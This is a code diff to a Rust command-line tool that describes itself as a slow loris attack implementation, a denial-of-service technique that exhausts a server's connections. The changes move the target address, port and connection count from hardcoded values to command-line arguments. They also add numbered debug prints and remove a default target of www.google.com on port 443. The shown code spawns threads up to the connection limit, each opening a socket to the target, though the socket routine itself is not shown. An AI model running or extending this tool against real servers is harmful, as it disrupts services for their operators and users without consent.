@@ -26,8 +26,8 @@ use tracing::{event, Level};
 struct Args {
     host: String,
     ip: IpAddr,
-    port: u16,
-    max_connections: u64,
+    port: String,
+    max_connections: String,
     timeout_min: u64,
     timeout_max: u64,
     body_length_min: usize,
@@ -38,8 +38,8 @@ impl Args {
         Self {
             host: String::from(""),
             ip: std::net::IpAddr::V4(Ipv4Addr::new(142, 251, 175, 10)),
-            port: 0,
-            max_connections: 0,
+            port: "0".to_string(),
+            max_connections: 0.to_string(),
             timeout_min: 0,
             timeout_max: u64::MAX,
             body_length_min: 0_usize,
@@ -120,9 +120,9 @@ fn main() {
     // set the important application variables and states
     let args = Arc::new(parse_args());
     //let host = args.host.clone();
-    tracing::trace!("args:{:?}", args);
-    tracing::trace!("host:{:?}", args.host);
-    tracing::trace!("ip:{:?}", args.ip);
+    tracing::trace!("123:args:{:?}", args);
+    tracing::trace!("124:host:{:?}", args.host);
+    tracing::trace!("125:ip:{:?}", args.ip);
     let attrs = Arc::new(Mutex::new(Attrs::new()));
 
     // create a progress bar
@@ -130,11 +130,13 @@ fn main() {
     // amount of connections
     let progress_bars = MultiProgress::new();
     progress_bars.set_draw_target(ProgressDrawTarget::stdout_with_hz(10));
-    let connection_bar = progress_bars.add(ProgressBar::new(args.max_connections).with_style(
-        ProgressStyle::default_bar().template(
-            "Average response time: {msg} ms\nSending connections: {pos}/{len}\n{wide_bar}",
+    let connection_bar = progress_bars.add(
+        ProgressBar::new(args.max_connections.parse::<u64>().unwrap()).with_style(
+            ProgressStyle::default_bar().template(
+                "Average response time: {msg} ms\nSending connections: {pos}/{len}\n{wide_bar}",
+            ),
         ),
-    ));
+    );
     let success_bar = progress_bars.add(ProgressBar::new(100).with_style(
         ProgressStyle::default_bar().template("successful requests: {pos}%\n{wide_bar}"),
     ));
@@ -150,8 +152,9 @@ fn main() {
 
     // change the Ctrl+C behaviour to just exit the process
     ctrlc::set_handler(|| std::process::exit(0)).expect("Could not change ctrl-c behaviour");
-    println!("{}", args.host);
-    println!("{:?}:{:?}", args.ip, args.port);
+    println!("153:args.host:{}", args.host);
+    //println!("154:args.domain:{}", args.domain);
+    println!("155:{:?}:{}", args.ip, args.port);
     tracing::debug!("body_length_min:{:?}", args.body_length_min);
     tracing::debug!("body_length_max:{:?}", args.body_length_max);
 
@@ -180,10 +183,10 @@ fn main() {
             success_bar.set_position(successful_connects);
 
             // spawn a new thread if not enough connections exists
-            if current_threads < args.max_connections {
-                let args = Arc::clone(&args);
+            if current_threads < args.max_connections.parse::<u64>().unwrap() {
+                let args = Arc::clone(&args.clone());
                 let attrs = Arc::clone(&attrs);
-                let port = args.port;
+                let port = args.port.clone();
 
                 {
                     let mut attrs = attrs.lock().unwrap();
@@ -194,10 +197,10 @@ fn main() {
                 }
 
                 spawn(move || {
-                    tracing::debug!("\n{:?}", args);
-                    tracing::debug!("\n{:?}", attrs);
-                    tracing::debug!("\n{:?}", args.port);
-                    new_socket(args, attrs, port);
+                    println!("{:?}", args);
+                    println!("{:?}", attrs);
+                    println!("{:?}", args.port);
+                    new_socket(args, attrs, port.parse::<u16>().unwrap());
                 });
             }
         }
@@ -224,16 +227,19 @@ fn parse_args() -> Args {
 
     let _ = Args::new(); //just a test
 
+    let authors = env!("CARGO_PKG_AUTHORS");
+    let version = env!("CARGO_PKG_VERSION");
+
     let matches = Command::new("Slow Loris")
                              .about("A slow loris attack implementation in Rust")
-                             //.author(clap::crate_authors!())
-                             //.version(clap::crate_version!())
+                             .author(authors)
+                             .version(version)
                              .arg(
                                  Arg::new("address")
                                      .help("The ip address of the server.")
                                      //.takes_value(true)
                                      .default_value("127.0.0.1")
-                                     .required(false),
+                                     .required(true),
                              )
                              .arg(
                                  Arg::new("domain")
@@ -279,8 +285,11 @@ fn parse_args() -> Args {
                              )
                              .get_matches();
 
-    //let port = matches.value_of("port").unwrap().parse().unwrap();
-    let max_connections = 2000u64; //matches.value_of("connections").unwrap().parse().unwrap();
+    //let port = *matches.get_one::<u16>("port").unwrap();
+    //let port = *matches.get_one::<String>("port").unwrap();
+    let port = matches.get_one::<String>("port").unwrap().clone();
+    let max_connections = matches.get_one::<String>("connections").unwrap().clone();
+    //let max_connections = *matches.get_one::<String>("connections").unwrap();
     let (timeout_min, timeout_max) = parse_range(&"5..10".to_string()).unwrap();
     let body_length = parse_range(&"11000".to_string()).unwrap();
     let (body_length_min, body_length_max) = (body_length.0 as usize, body_length.1 as usize);
@@ -288,29 +297,30 @@ fn parse_args() -> Args {
     //use dns_lookup::getnameinfo;
     use std::net::{IpAddr, SocketAddr};
     let host;
+    let address = matches.get_one::<String>("address").unwrap().clone();
     //let ip;
     let mut ip: IpAddr = "127.0.0.1".parse().unwrap();
-    let port = 443u16; //args.port;
-    let address = "www.google.com"; //matches.value_of("address").unwrap();
-    println!("address:{}", address);
+    //let port = 443u16; //args.port;
+    //let address = "www.google.com"; //matches.value_of("address").unwrap();
+    println!("301:address:{}", address);
     match address.parse::<IpAddr>() {
         Ok(parsed) => {
             host = dns_lookup::lookup_addr(&parsed).expect("Could not find hostname for given ip");
             ip = parsed;
-            tracing::info!("{}:{}", host, ip);
+            tracing::info!("306:{}:{}", host, ip);
         }
         Err(_) => {
             host = address.to_string();
-            println!("host={}", host);
-            tracing::debug!("{}", host);
+            println!("310:host={}", host);
+            tracing::debug!("311:{}", host);
 
             //let hostname = "localhost";
             //let ips: Vec<std::net::IpAddr> = lookup_host(hostname).unwrap();
             //            let socket: SocketAddr = (host, 0).into();
 
             //let mut ip: IpAddr = "127.0.0.1".parse().unwrap();
-            let socket: SocketAddr = (ip, port).into();
-            tracing::info!("{}", socket);
+            let socket: SocketAddr = (ip, port.parse::<u16>().unwrap()).into();
+            tracing::info!("319:{}", socket);
 
             //host = getnameinfo(&socket, 0).unwrap();
 
@@ -319,8 +329,8 @@ fn parse_args() -> Args {
                 Err(e) => panic!("Failed to lookup socket {:?}", e),
             };
 
-            println!("name={}", name);
-            println!("service={}", service);
+            println!("328:name={}", name);
+            println!("329:service={}", service);
 
             let ips: Vec<std::net::IpAddr> =
                 lookup_host(&host).unwrap_or(vec!["192.168.1.1".parse().unwrap()]);
